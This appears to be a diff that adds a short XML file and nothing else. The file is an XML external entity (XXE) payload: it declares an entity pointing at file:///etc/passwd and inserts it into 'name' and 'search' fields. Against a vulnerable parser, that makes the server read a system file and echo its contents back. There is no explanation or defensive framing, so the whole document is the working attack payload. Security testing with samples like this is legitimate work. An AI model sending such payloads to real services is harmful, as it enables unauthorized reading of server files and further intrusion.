@@ -1,0 +1,14 @@
+<?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE r [ 
+    <!ELEMENT r ANY>
+    <!ENTITY sp SYSTEM 
+    "file:///etc/passwd"> 
+    ]>
+    <root>
+        <name>
+        &sp;
+        </name>
+        <search>
+        &sp;
+        </search>
+    </root>
